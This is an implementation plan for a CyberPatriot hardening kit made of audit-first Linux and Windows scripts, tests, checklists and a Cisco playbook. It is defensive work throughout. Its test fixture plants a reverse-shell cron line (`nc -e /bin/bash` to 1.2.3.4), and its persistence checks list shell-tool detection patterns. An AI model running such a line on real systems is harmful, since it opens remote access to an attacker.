# CyberPatriot Hardening Kit Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Audit-first, README-driven, checkpointed hardening scripts for Linux (Mint 21 / Debian 12) and Windows (11 + Server 2022), plus per-OS checklists and a Cisco Packet Tracer playbook.

**Architecture:** One entry script per OS family → a menu of independent modules. Every module goes *decide → show → (apply only with `--apply`/`-Apply` + y/N) → back up → log*. The decision logic lives in **pure functions** (input: current state + config, output: an action list) so it can be unit-tested without touching a system. Thin "apply" wrappers do the actual changes.

**Tech Stack:** bash 5 (coreutils, apt, systemctl, ufw), Windows PowerShell 5.1 (built-in cmdlets, `secedit`, `auditpol`, `netsh`), Pester 3.4 (ships with Win10/11) for Windows unit tests, Docker (`linuxmintd/mint21-amd64`, `debian:12`, `ubuntu:22.04`) for Linux tests. No Python, no third-party modules in the scripts.

**Spec:** `docs/design.md` (approved 2026-10-19) + `docs/research.md` (sources, scored values).

## Global Constraints
- Audit is the default. Changes only happen with `--apply` (bash) / `-Apply` (PS) **and** a per-action `y/N` (`--yes`/`-Yes` skips prompts; only the tests use it).
- Never delete files. Media, tools and backdoor binaries are **reported** to `findings.txt`; the human removes them after forensics.
- Never remove, disable or change the password of: anyone in `ADMINS`/`USERS`, the account running the script, or built-in system accounts. Never stop/disable/purge anything in `CRITICAL_SERVICES` or `ALLOWED_SOFTWARE`.
- Never touch the CyberPatriot scoring client: skip any path, service or package matching `(?i)cyberpatriot|cpscor|scoring|aeacus`.
- Before editing any file, back it up to `<run dir>/backup/<original path>`. Every action goes to `<run dir>/log.txt` as `TIME | MODULE | ACTION | before -> after | why`.
- Run dir: Linux `/root/cpkit-runs/<YYYYmmdd-HHMMSS>/`, Windows `C:\cpkit-runs\<yyyyMMdd-HHmmss>\`.
- No auto-reboot. No GRUB password. No outbound firewall restrictions.
- Output is ASCII only (Windows console codepage safety). Every printed action has a one-line `why`.
- Scored values (from `research.md` §1, the Win10 answer key): lockout threshold **5** (accepted 5–50), lockout duration **30** (30–60), reset counter **30** (30–60), password history **5** (5–10), min age **10** (10–30), max age **90** (30–90), min length **10** (8–14), complexity on, reversible encryption off. Linux equivalents: `PASS_MAX_DAYS 90`, `PASS_MIN_DAYS 10`, `PASS_WARN_AGE 7`, `minlen=10`, `remember=5`, faillock `deny=5 unlock_time=1800`.

## Config file (shared format, both OSes) — `config/cp-config.example.txt`
```
# Fill from the round README. One line per key; lists are space-separated.
ADMINS=santa prancer
USERS=cupid dasher
CRITICAL_SERVICES=ssh vsftpd        # Linux: unit names; Windows: service *names* (e.g. TermService)
ALLOWED_SOFTWARE=firefox notepad++
NEW_PASSWORD=Cyb3rP@triot!2026      # used for created users and for users with blank/insecure passwords
KEEP_RDP=no                         # Windows: yes if README says Remote Desktop is required
KEEP_SHARES=                        # Windows: share names the README requires
```
Unknown keys → warning, not an error. Missing `ADMINS` → the users module refuses to run (prints why).

## Review Focus
1. **Config typos** (e.g. a README name misspelled in `ADMINS`) → the users module must list "will REMOVE: x" and require y/N per user; it must never delete the current user even if missing from config. *Test: Task 2 / Task 7, `plan_users` with the current user absent from the config → no remove action for them.*
2. **Running audit twice or apply twice** → idempotent: the second apply makes zero changes. *Test: Task 5 harness runs apply twice, asserts the log's second run has 0 ACTION lines.*
3. **Critical service also on the "bad services" list** (e.g. README requires FTP, SSH or RDP) → critical wins; the module prints "kept (critical)". *Test: Task 4 / Task 8 planner test with `vsftpd` / `TermService` critical.*
4. **Run without root/Admin** → exit 1 with a clear message before doing anything. *Test: Task 1 / Task 6.*
5. **Image is a domain controller (Server)** → local-user cmdlets fail on a DC; the users module must detect a DC and switch to AD cmdlets or report-only. *Test: Task 9, planner given `IsDC=$true` emits AD actions only.*

---

## File Structure
```
cyberpatriot-kit/
  README.md                      quick start, download one-liners, safety rules
  config/cp-config.example.txt
  linux/harden.sh                entry: flags, menu, sources lib + modules
  linux/lib/common.sh            config, logging, backup, ask, act, guards
  linux/modules/{users,passwords,firewall,ssh,sysctl,perms,services,software,media,persistence,updates}.sh
  linux/tests/unit.sh            pure-function tests (run in a container)
  linux/tests/plant-vulns.sh     creates a vulnerable "image" inside a container
  linux/tests/verify.sh          asserts fixes + asserts authorized things untouched
  linux/tests/run-tests.sh       docker matrix: mint21, debian12, ubuntu22
  windows/harden.ps1             entry: params, menu, imports lib + modules
  windows/lib/CpCommon.psm1      config, logging, backup, ask, Invoke-CpAction, guards
  windows/lib/CpSecedit.psm1     pure .inf read/modify helpers
  windows/modules/{Users,AccountPolicy,AuditPolicy,SecurityOptions,Firewall,Defender,Services,Shares,Remote,Updates,Software,Media,Persistence,Server}.ps1
  windows/tests/*.Tests.ps1      Pester 3.4 unit tests on the pure functions
  checklists/{windows.md,server.md,linux.md,cisco.md}
  cisco/templates/*.txt          copy-paste IOS blocks
  docs/{design.md,research.md,superpowers/plans/...}
```

---

### Task 1: Linux common library + config

**Files:** Create `linux/lib/common.sh`, `config/cp-config.example.txt`, `linux/tests/unit.sh`

**Interfaces — Produces:**
- `cp_load_config FILE` → sets globals `CP_ADMINS CP_USERS CP_CRITICAL CP_ALLOWED CP_NEWPASS` (space-separated strings); returns 1 + message if the file is missing.
- `cp_in_list ITEM "LIST"` → 0 if ITEM is a whole word in LIST (case-sensitive for users, case-insensitive for services).
- `cp_is_protected_user NAME` → 0 if NAME is in ADMINS/USERS, equals `$SUDO_USER`, or has UID < 1000 (except UID 0 named other than root).
- `cp_is_protected_service NAME` → 0 if in CRITICAL or it matches the scoring regex.
- `cp_log MODULE ACTION BEFORE AFTER WHY` → appends to `$CP_RUN/log.txt`.
- `cp_backup PATH` → copies to `$CP_RUN/backup$PATH` once per run.
- `cp_act MODULE "description" "why" cmd args…` → audit: prints `[WOULD] description — why`; apply: prints, asks y/N (unless `CP_YES=1`), runs, logs.
- `cp_finding MODULE "text"` → appends to `$CP_RUN/findings.txt` and prints `[CHECK]`.
- Globals: `CP_MODE` (`audit`|`apply`), `CP_YES`, `CP_RUN`.

- [ ] Step 1: Write `unit.sh` tests: config parse of the example (ADMINS == "santa prancer"); `cp_in_list dasher "$CP_USERS"` → 0, `cp_in_list das "$CP_USERS"` → 1; `cp_is_protected_service cyberpatriot-scorer` → 0; `cp_act` in audit mode leaves a temp file unchanged and prints `[WOULD]`; `cp_backup` twice → one backup copy.
- [ ] Step 2: `docker run --rm -v "$PWD":/k debian:12 bash /k/linux/tests/unit.sh` → FAIL (functions missing).
- [ ] Step 3: Implement `common.sh`. Use `set -u`, no `set -e` inside the library (modules handle errors). Root check: `cp_require_root` exits 1 with "Run with sudo".
- [ ] Step 4: Re-run → all PASS.
- [ ] Step 5: `git init` (first task only), commit `feat(linux): common lib + config format`.

### Task 2: Linux users + passwords modules

**Files:** Create `linux/modules/users.sh`, `linux/modules/passwords.sh`; extend `linux/tests/unit.sh`

**Interfaces — Consumes:** Task 1. **Produces:**
- `plan_users "HUMANS" "SUDOERS" "UID0" "EMPTYPW"` → stdout, one action per line: `REMOVE_USER x`, `ADD_USER x`, `ADD_SUDO x`, `DEL_SUDO x`, `DEL_UID0 x`, `SET_PASS x`, `LOCK_ROOT`. Pure: reads only its args + `CP_*`.
- `mod_users`, `mod_passwords` (apply wrappers).
- Sudo group name: `sudo` on Debian/Ubuntu/Mint. Also report `wheel`/`admin` if present.

- [ ] Step 1: Tests for `plan_users`: an unknown human → `REMOVE_USER`; a listed user missing → `ADD_USER`; a non-admin in sudo → `DEL_SUDO`; an admin not in sudo → `ADD_SUDO`; an extra UID-0 account `toor` → `DEL_UID0 toor`; a user with an empty password → `SET_PASS`; **`$SUDO_USER` not in config → no REMOVE for them** (Review Focus 1).
- [ ] Step 2: Run → FAIL.
- [ ] Step 3: Implement. Apply: `userdel` **without `-r`** (keep the home dir; files may be forensics evidence), `useradd -m`, `gpasswd -a/-d`, `chpasswd` with `CP_NEWPASS`, `passwd -l root`. Also report: users with a shell in `/etc/passwd` but UID < 1000 and a login shell, `/etc/sudoers.d/*` NOPASSWD lines, and lightdm/gdm guest/autologin settings (finding; apply sets `allow-guest=false` in `/etc/lightdm/lightdm.conf.d/50-cpkit.conf` and removes `autologin-user`).
- [ ] Step 4: `passwords.sh`: set `/etc/login.defs` values (Global Constraints); install `libpam-pwquality` only if missing **and** apt works; set `minlen=10 ucredit=-1 lcredit=-1 dcredit=-1 ocredit=-1` in `/etc/security/pwquality.conf`; add `remember=5` to the `pam_unix.so` password line in `/etc/pam.d/common-password`; faillock `deny=5 unlock_time=1800` in `/etc/security/faillock.conf` + `pam_faillock` in `common-auth` using **Debian's documented 3-line pattern**. Remove `nullok`. Back up every PAM file. After editing PAM, run `pamtester`-free sanity: `grep -c pam_unix.so` is unchanged, otherwise restore from backup and print `PAM edit reverted`.
- [ ] Step 5: Tests pass → commit `feat(linux): users and password policy modules`.

### Task 3: Linux firewall, ssh, sysctl, perms modules

**Files:** Create `linux/modules/{firewall,ssh,sysctl,perms}.sh`

**Interfaces — Produces:** `mod_firewall`, `mod_ssh`, `mod_sysctl`, `mod_perms`, plus pure `plan_ssh FILE` → lines `SET key value` for each sshd_config key that differs.

- Firewall: install ufw if missing; `ufw default deny incoming`, `default allow outgoing`; `ufw allow` for each critical service with a known port map (`ssh 22, vsftpd 21, apache2 80 443, nginx 80 443, smbd 139 445, mysql 3306, postfix 25`); `ufw logging on`; `ufw --force enable`.
- SSH (only if `ssh`/`sshd` is critical, otherwise a finding "SSH installed but not critical — consider removing"): `PermitRootLogin no`, `PermitEmptyPasswords no`, `PasswordAuthentication yes` (never lock out), `X11Forwarding no`, `MaxAuthTries 4`, `LoginGraceTime 60`, `ClientAliveInterval 300`, `Protocol 2`(harmless on new versions). Validate with `sshd -t` after editing; on failure restore the backup. Owner root:root, mode 600.
- sysctl → `/etc/sysctl.d/99-cpkit.conf`: `kernel.randomize_va_space=2`, `net.ipv4.tcp_syncookies=1`, `net.ipv4.icmp_echo_ignore_broadcasts=1`, `net.ipv4.conf.all.accept_redirects=0`, `net.ipv4.conf.all.send_redirects=0`, `net.ipv4.conf.all.accept_source_route=0`, `net.ipv4.conf.all.rp_filter=1`, `net.ipv4.conf.all.log_martians=1`, `net.ipv6.conf.all.accept_redirects=0`, `kernel.dmesg_restrict=1`, `fs.protected_symlinks=1`, `fs.protected_hardlinks=1`; `net.ipv4.ip_forward=0` **unless** the README makes this a router (finding). Apply with `sysctl --system`.
- Perms: `/etc/passwd 644`, `/etc/group 644`, `/etc/shadow 640 root:shadow`, `/etc/gshadow 640 root:shadow`, `/etc/sudoers 440`, `/etc/ssh/sshd_config 600`; report-only: world-writable files in `/etc` and SUID binaries not in a default list (`find / -xdev -perm -4000`).

- [ ] Step 1: Unit tests for `plan_ssh` on a fixture with `PermitRootLogin yes` + a missing `PermitEmptyPasswords` → the two `SET` lines; on an already-correct fixture → empty output.
- [ ] Step 2: Run → FAIL. Step 3: Implement all four. Step 4: Tests PASS. Step 5: Commit `feat(linux): firewall ssh sysctl perms`.

### Task 4: Linux services, software, media, persistence, updates

**Files:** Create `linux/modules/{services,software,media,persistence,updates}.sh`

**Interfaces — Produces:** pure `plan_services "ACTIVE_UNITS"` → `DISABLE unit` / `KEEP unit (critical)`; pure `plan_software "INSTALLED_PKGS"` → `PURGE pkg` / `REVIEW pkg`.
- Bad services (disable+stop unless critical): `apache2 nginx vsftpd proftpd pure-ftpd smbd nmbd telnet.socket inetd xinetd rsh-server nfs-server rpcbind snmpd cups avahi-daemon isc-dhcp-server bind9 named postfix dovecot squid mysql mariadb`.
- Software PURGE (hacking/games, confirm each): `john hydra hydra-gtk nmap zenmap ophcrack aircrack-ng wireshark tshark ettercap-* kismet nikto sqlmap medusa netcat-traditional netcat-openbsd* ncat fcrackzip p0f dsniff burpsuite metasploit* freeciv aisleriot gnome-mines gnome-sudoku minetest telnet rsh-client`. (*`netcat-openbsd` = REVIEW, not PURGE: it is a dependency on Mint.) Anything in `ALLOWED_SOFTWARE` → skipped.
- Media: report only, `find /home /root /srv /opt /var/www /tmp -type f` with extensions `mp3 mp4 avi mkv mov wav flac ogg m4a wma jpg jpeg png gif` (images only under /home), plus `*.zip *.tar.gz *.7z` in home dirs, plus files named `*password*`, `*.kdbx`.
- Persistence: report all of: `crontab -l` per user, `/etc/cron.*`, `/etc/crontab`, `systemctl list-timers`, `/etc/rc.local`, `~/.bashrc`/`.profile` lines with `nc|bash -i|/dev/tcp|curl|wget`, listening ports `ss -tulpn` → `listening.txt`, `/etc/hosts` non-default lines, and the authorized_keys of each user.
- Updates: uncomment `deb` lines in `/etc/apt/sources.list` (Debian) after backup; enable unattended-upgrades (`APT::Periodic::Update-Package-Lists "1"; APT::Periodic::Unattended-Upgrade "1";` in `/etc/apt/apt.conf.d/20auto-upgrades`); then `apt-get update` and **ask** before `apt-get -y upgrade` (slow). Mint: the same file plus a finding "also set Update Manager > Preferences by hand".

- [ ] Step 1: Tests: `plan_services "vsftpd.service ssh.service cups.service"` with `CRITICAL_SERVICES=vsftpd` → `KEEP vsftpd (critical)`, `DISABLE cups`, ssh untouched (not on the bad list) (Review Focus 3). `plan_software "john nmap firefox"` with `ALLOWED_SOFTWARE=nmap` → `PURGE john`, nmap skipped, firefox absent.
- [ ] Step 2: FAIL. Step 3: Implement. Step 4: PASS. Step 5: Commit `feat(linux): services software media persistence updates`.

### Task 5: Linux entry script + container test harness

**Files:** Create `linux/harden.sh`, `linux/tests/{plant-vulns.sh,verify.sh,run-tests.sh}`

**Interfaces — Consumes:** all `mod_*` functions. **Produces:** CLI `sudo bash harden.sh [--apply] [--yes] [--config FILE] [--module NAME ...]`. With no `--module`: interactive numbered menu (each module, "all in recommended order", quit). Default config path: `./cp-config.txt`. Prints at start: mode, config summary, run dir, and **"Did you answer the forensics questions and take a VMware snapshot? (y/N)"** → `N` exits.

- `plant-vulns.sh` creates (inside the container): users `santa`(admin) `cupid`(user, missing → absent) `hacker`(unauthorized) `prancer`(in sudo but not an admin), `toor` UID 0, `dasher` with an empty password, `/etc/shadow` 666, `PermitRootLogin yes`, sysctl syncookies 0, a cron job `* * * * * root nc -e /bin/bash 1.2.3.4 4444`, `/home/santa/Music/song.mp3`, packages `john nmap` installed, vsftpd installed (critical) + cups.
- `verify.sh` asserts after `--apply --yes`: hacker gone, toor gone, prancer not in sudo, cupid exists, santa still in sudo, dasher has a password, shadow mode 640, `PermitRootLogin no`, `sysctl -n net.ipv4.tcp_syncookies` = 1 (file present), john purged, **nmap kept when listed as allowed**, vsftpd still installed, **song.mp3 still exists** and is listed in findings.txt, the cron job is listed in findings.txt. A second `--apply --yes` run → `grep -c ACTION log.txt` = 0 for the second run dir (Review Focus 2).
- Audit-only run: a snapshot of `/etc` before vs after (`tar c /etc | sha256sum`) is identical.
- `run-tests.sh`: for each of `linuxmintd/mint21-amd64:latest debian:12 ubuntu:22.04` → `docker run --rm` the unit tests, then plant → audit → assert unchanged → apply → verify. systemd isn't running in containers: the services module detects `! pidof systemd` and runs in report-only mode (the test asserts it says so).
- Non-root run → exit 1 (Review Focus 4): `docker run --user 1000 … harden.sh` → exit code 1, message "Run with sudo".

- [ ] Step 1: Write the three test scripts. Step 2: `bash linux/tests/run-tests.sh` → FAIL (no harden.sh). Step 3: Implement `harden.sh`. Step 4: `run-tests.sh` → all 3 distros PASS. Step 5: Commit `feat(linux): entry script + container test matrix`.

### Task 6: Windows common module + config

**Files:** Create `windows/lib/CpCommon.psm1`, `windows/tests/CpCommon.Tests.ps1`

**Interfaces — Produces:**
- `Import-CpConfig -Path` → `[pscustomobject]@{Admins=[string[]];Users=[string[]];Critical=[string[]];Allowed=[string[]];NewPassword=[string];KeepRdp=[bool];KeepShares=[string[]]}`; throws if `ADMINS` is empty only when `-RequireUsers` is given.
- `Test-CpProtectedUser -Name -Config` → `$true` for config users, `$env:USERNAME`, `Administrator`, `Guest`, `DefaultAccount`, `WDAGUtilityAccount`, `defaultuser0` (built-ins get disabled by the Users module, never deleted).
- `Test-CpProtectedService -Name -Config` → critical or matching `(?i)cyberpatriot|cpscor|scoring|aeacus`.
- `Write-CpLog -Module -Action -Before -After -Why`, `Backup-CpFile -Path`, `Backup-CpRegistry -Key` (`reg export`), `Add-CpFinding -Module -Text`.
- `Invoke-CpAction -Module -Description -Why -ScriptBlock` → honours `$script:CpApply` and `$script:CpYes`; audit prints `[WOULD]`.
- `Assert-CpAdmin` → exits 1 with "Run PowerShell as Administrator" (Review Focus 4).

- [ ] Step 1: Pester tests: parse the example config; the KeepRdp default is `$false`; `Test-CpProtectedUser $env:USERNAME` → true; `Invoke-CpAction` in audit mode never runs its scriptblock (a scriptblock that sets a variable → still unset).
- [ ] Step 2: `powershell -NoProfile -Command "Invoke-Pester windows/tests"` → FAIL. Step 3: Implement. Step 4: PASS. Step 5: Commit `feat(windows): common module`.

### Task 7: Windows users + account/audit policy + security options

**Files:** Create `windows/lib/CpSecedit.psm1`, `windows/modules/{Users,AccountPolicy,AuditPolicy,SecurityOptions}.ps1`, tests `windows/tests/{Users,CpSecedit}.Tests.ps1`

**Interfaces — Produces:**
- `Get-CpUserPlan -LocalUsers [string[]] -Admins [string[]] -DisabledUsers [string[]] -Config -CurrentUser` → `[pscustomobject[]]` with `Action` ∈ `RemoveUser, AddUser, EnableUser, AddAdmin, RemoveAdmin, DisableBuiltin, SetPassword, PasswordNeverExpiresOff` and `Name`. Pure.
- `Get-CpInfValue -InfText -Section -Key` / `Set-CpInfValue -InfText -Section -Key -Value` → string (pure text edits of the `secedit /export` output).
- Users apply: `Remove-LocalUser`, `New-LocalUser` + `Add-LocalGroupMember Users`, `Enable-LocalUser`, group add/remove, `Disable-LocalUser Administrator,Guest`, `Set-LocalUser -PasswordNeverExpires $false`, and `Set-LocalUser -Password` with NewPassword **only for listed users other than the current user** whose password is blank/unknown → (prompted per user). Also sets "User must change password at next logon" off (it can block the current scoring).
- AccountPolicy via secedit `[System Access]`: `MinimumPasswordLength=10 PasswordComplexity=1 PasswordHistorySize=5 MaximumPasswordAge=90 MinimumPasswordAge=10 ClearTextPassword=0 LockoutBadCount=5 LockoutDuration=30 ResetLockoutCount=30`. Flow: `secedit /export /cfg old.inf` → backup → `Set-CpInfValue` → `secedit /configure /db cpkit.sdb /cfg new.inf /areas SECURITYPOLICY` → re-export and compare.
- AuditPolicy: `auditpol /set /category:* /success:enable /failure:enable` (backup: `auditpol /backup /file:`).
- SecurityOptions (registry values via secedit `[Registry Values]`, from research §1): Guest/Administrator account disabled; LimitBlankPasswordUse=1; no CTRL+ALT+DEL off (DisableCAD=0); RestrictAnonymousSAM=1; RestrictAnonymous=1; EveryoneIncludesAnonymous=0; LmCompatibilityLevel=5; NoLMHash=1; EnablePlainTextPassword=0; RequireSecuritySignature=1 (server); AddPrinterDrivers=1; UAC: EnableLUA=1, ConsentPromptBehaviorAdmin=2, PromptOnSecureDesktop=1, EnableUIADesktopToggle=0; ClearPageFileAtShutdown=1; DontDisplayLastUserName=1; recovery console autologon off.

- [ ] Step 1: Pester: the plan for Santa's Workshop (`Admins=santa`, `Users=cupid,prancer`; local `santa(disabled) prancer rudolph`, admins `prancer`) → `EnableUser santa, AddAdmin santa, AddUser cupid, RemoveUser rudolph, RemoveAdmin prancer, DisableBuiltin Administrator, DisableBuiltin Guest`; **the current user is never in a Remove** (Review Focus 1). `Set-CpInfValue` on a fixture inf changes `MinimumPasswordLength = 0` → `10` and leaves other lines byte-identical; adds the key if missing.
- [ ] Step 2: FAIL. Step 3: Implement. Step 4: PASS. Step 5: Commit `feat(windows): users + policies`.

### Task 8: Windows firewall, defender, services, shares, remote, updates

**Files:** Create `windows/modules/{Firewall,Defender,Services,Shares,Remote,Updates}.ps1`, test `windows/tests/Services.Tests.ps1`

**Interfaces — Produces:** pure `Get-CpServicePlan -Services [pscustomobject[]{Name,StartType,Status}] -Config` → `Disable`/`EnableAuto`/`KeepCritical` actions.
- Firewall: all profiles `Enabled True, DefaultInboundAction Block, DefaultOutboundAction Allow, NotifyOnListen True, AllowUnicastResponseToMulticast False, LogBlocked True`. Report inbound allow rules for non-default programs as findings.
- Defender: `Set-MpPreference` real-time on, cloud on, PUA on; **report and (with confirm) remove `ExclusionExtension/Path/Process`** (the CP19 `.exe` exclusion vuln); `Update-MpSignature`; start a quick scan (async, don't wait).
- Services Disable list: `RemoteRegistry, SNMPTRAP, SNMP, TapiSrv, NetTcpPortSharing, RasMan, RpcLocator, simptcp, TlntSvr, FTPSVC, W3SVC, SSDPSRV, upnphost, WMSvc, iphlpsvc, Browser, lfsvc, MapsBroker, XblAuthManager, XblGameSave, XboxNetApiSvc, RemoteAccess, SharedAccess, WinRM` (minus critical). EnableAuto: `wuauserv, WinDefend, mpssvc, EventLog, wscsvc`. **Never**: `Dnscache` (the old answer key disabled the DNS Client — that's image-specific, so it's a finding only), `TermService` unless `KEEP_RDP=no`.
- Shares: list `Get-SmbShare`; remove non-default shares (not `ADMIN$ C$ IPC$ print$ NETLOGON SYSVOL` and not in KEEP_SHARES) with confirm; `Set-SmbServerConfiguration -EnableSMB1Protocol $false`, `Disable-WindowsOptionalFeature SMB1Protocol -NoRestart`.
- Remote: if `KEEP_RDP=no` → `fDenyTSConnections=1` + remote assistance off (`fAllowToGetHelp=0`); if yes → keep enabled, set NLA `UserAuthentication=1` and `SecurityLayer=2`.
- Updates: `wuauserv` auto + start; AU policy `NoAutoUpdate=0, AUOptions=4`; open Settings > Windows Update and print "click Check for updates" (no forced install loop). Findings: Firefox/Chrome/Notepad++ versions → "update manually".
- Features (in this task): disable `TelnetClient`, `TFTP`, `SMB1Protocol`, `Internet-Explorer-Optional-amd64` is **left alone** (an old key wanted it enabled).

- [ ] Step 1: Pester: `Get-CpServicePlan` with `TermService` critical and `KEEP_RDP=yes` → no Disable for TermService; `RemoteRegistry` running → Disable; `wuauserv` Manual → EnableAuto; `Dnscache` → no action (Review Focus 3).
- [ ] Step 2: FAIL. Step 3: Implement. Step 4: PASS. Step 5: Commit `feat(windows): firewall defender services shares remote updates`.

### Task 9: Windows reports, entry script, Server module

**Files:** Create `windows/modules/{Software,Media,Persistence,Server}.ps1`, `windows/harden.ps1`, test `windows/tests/Server.Tests.ps1`

**Interfaces — Produces:** CLI `powershell -ExecutionPolicy Bypass -File harden.ps1 [-Apply] [-Yes] [-Config path] [-Module Name[]] [-Server]`; with no `-Module` → menu. Same forensics/snapshot gate as Linux. Auto-detects Server (`(Get-CimInstance Win32_OperatingSystem).ProductType -ne 1`) and DC (`ProductType -eq 2`).
- Software (report): installed programs from both Uninstall registry hives, flagged against a list (`Wireshark, Nmap, Angry IP, Cain, CCleaner, TeamViewer, AnyDesk, uTorrent, BitTorrent, iTunes, Bonjour, Driver Support, Web Companion, NetStumbler, PC Cleaner, GooseDesktop, Npcap, WinPcap, FileZilla Server, Tor` + anything with `crack|keygen|hack`) minus ALLOWED; prints the uninstall string per item. The human runs `appwiz.cpl`. **No auto-uninstall** (uninstallers are interactive and unreliable).
- Media (report): `C:\Users\*`, `C:\` top-level non-default folders, extensions as Linux + `exe msi` in Downloads/Desktop.
- Persistence (report): Run/RunOnce keys (HKLM/HKCU/Wow6432), Startup folders, scheduled tasks with non-Microsoft authors, `netstat -ano` → `listening.txt` with the process names, the hosts file non-default lines, services whose binary path is outside `C:\Windows` and `Program Files`, `nc.exe`/`ncat.exe`/`bd.exe` anywhere on C:.
- Server module: if DC → AD users plan via `Get-ADUser`/`Get-ADGroupMember 'Domain Admins'` (same `Get-CpUserPlan`, with built-ins `krbtgt` protected) and the domain password policy via `Set-ADDefaultDomainPasswordPolicy` with the same values; else the local path. Reports: installed roles (`Get-WindowsFeature | ? Installed`), DNS zone transfers (`Get-DnsServerZone` → `SecureSecondaries`), IIS sites + directory browsing + anonymous auth, FTP anonymous. SMB signing required `RequireSecuritySignature=1`.

- [ ] Step 1: Pester: `Get-CpUserPlan` with `-IsDC` and `krbtgt` present → no action on krbtgt; the Server module's plan uses the AD action names `RemoveADUser/AddDomainAdmin…` when IsDC (Review Focus 5).
- [ ] Step 2: FAIL. Step 3: Implement. Step 4: `Invoke-Pester windows/tests` all PASS + `[System.Management.Automation.Language.Parser]::ParseFile` on every .ps1 → 0 errors. Step 5: **Live audit run on this PC (read-only, with Sanh's OK)**: `harden.ps1` (audit, all modules) → completes, writes findings, `git status` of the system untouched (check: no new files outside `C:\cpkit-runs`). Step 6: Commit `feat(windows): reports, entry script, server module`.

### Task 10: OS checklists

**Files:** Create `checklists/{windows.md,server.md,linux.md}`
Order inside each: **0. Setup** (snapshot, read the README twice, write the config) → **1. Forensics** (method table: hashes, decoding, `Get-SmbShare`, `Get-Acl`, event IDs 4720/4724/4732, browser history, `netstat -ano`, `find -newer`) → **2. Users** → **3. Script modules in order** (`users → AccountPolicy → AuditPolicy → SecurityOptions → Firewall → Defender → Services → Remote → Shares → Updates` / Linux `users → passwords → firewall → ssh → sysctl → perms → services → updates`) with a snapshot between each → **4. Read findings.txt and act by hand** → **5. Manual-only items** (browser settings: Firefox/Chrome reset + popup block + safe browsing; app configs from the README; Update Manager on Mint; screen lock) → **6. Things that lose points** (removing README users/services, deleting forensics evidence, stopping the scoring service). Each line: `[ ] what — why — how to verify`. Organised by the 13 official CP categories (research §1). Every scored value matches the Global Constraints.
- [ ] Step 1: Write. Step 2: Cross-check every module action appears in the checklist (`grep` the module list) and vice versa. Step 3: Commit `docs: per-OS checklists`.

### Task 11: Cisco playbook

**Files:** Create `checklists/cisco.md`, `cisco/templates/{01-basics,02-interfaces,03-vlans-trunks,04-routing-static,05-eigrp-ospf,06-ssh,07-port-security,08-dhcp-nat,09-hosts-verify}.txt`
Sources: the existing `cyberpatriot-cisco-prep.md`, the practice-round PT activity (EIGRP, PC/server add, FTP test), the club's 2019 Cisco Question Bank (`scratchpad/refs/cisco_question_bank.txt`) and the 2025 NetAcad supplement doc, NetAcad ITN modules.
- Playbook flow: test-day steps → read PT Activity → do each device in the order the instructions give → verify (`show ip int brief`, `show vlan brief`, `show ip route`, ping chain: gateway → remote → DNS name) → save (`write mem` + Ctrl+S) → End Test.
- Templates use `<PLACEHOLDER>` caps for values, with comments `!` explaining each line. Include a troubleshooting table (symptom → command → fix) and a subnet cheat sheet (/24…/30 masks, wildcards, host counts).
- Quiz section: a topic list for ITN modules plus 30 practice Q&A drawn from the question bank (reworded, answers explained).
- [ ] Step 1: Write. Step 2: Self-check: every IOS command is valid IOS 15 syntax (`switchport trunk allowed vlan 1,10,20`, `ip routing` on L3, `switchport trunk encapsulation dot1q` on 3560/3650). Step 3: Commit `docs: cisco playbook + templates`.

### Task 12: README + publish

**Files:** Create `README.md`
- Quick start per OS: download one-liners (`irm https://raw.githubusercontent.com/<user>/<repo>/main/... -OutFile`, `wget -qO- …/archive/main.tar.gz | tar xz`), "copy config, edit, run audit, read, snapshot, run apply per module".
- The safety rules (Global Constraints) in plain English. Credits table (from research §4).
- [ ] Step 1: Write. Step 2: **Ask Sanh** for the GitHub repo name and confirm public visibility → create + push (only after a yes). Step 3: Test the one-liner download from a clean container (`curl` raw URL → file matches the local sha256).

### Task 13: Real-image validation (needs Sanh)
- [ ] Mint 21 practice image (CP19 practice round `cp19_pr_e_mint21.zip`, or an aeacus practice image from the club's practice-image sheet): snapshot → audit → apply module by module → compare the score report. Log every point lost.
- [ ] Win11 practice image: same, driven by `vmrun` or by hand.
- [ ] Server 2022 practice image: same + the jxv133 checker as an independent read-only verifier.
- [ ] Fix anything found, re-run the tests, commit `fix: issues from image validation`.

---

## Execution order and timing
Round 1 (Oct 22–25) = Windows 11 + Mint 21, so: **T1→T5 (Linux)** and **T6→T9 (Windows)** first, then T10 checklists, T12 publish (so teammates have it), T11 Cisco, T13 validation as images become available. The Server module (part of T9) and Debian support (in T5's matrix) are already covered for Round 2.
